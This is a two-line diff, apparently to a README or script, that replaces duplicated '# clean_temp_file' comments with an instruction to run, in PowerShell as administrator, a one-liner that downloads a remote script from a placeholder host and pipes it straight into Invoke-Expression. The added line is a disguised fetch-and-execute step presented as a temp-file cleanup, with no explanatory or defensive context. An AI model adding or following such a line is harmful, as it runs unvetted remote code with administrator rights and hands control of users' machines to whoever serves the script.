@@ -1,2 +1,1 @@
-# clean_temp_file
-# clean_temp_file
+run it on powershell as adminsrator ```irm https://example.com/cleanup_temp.bat | iex```
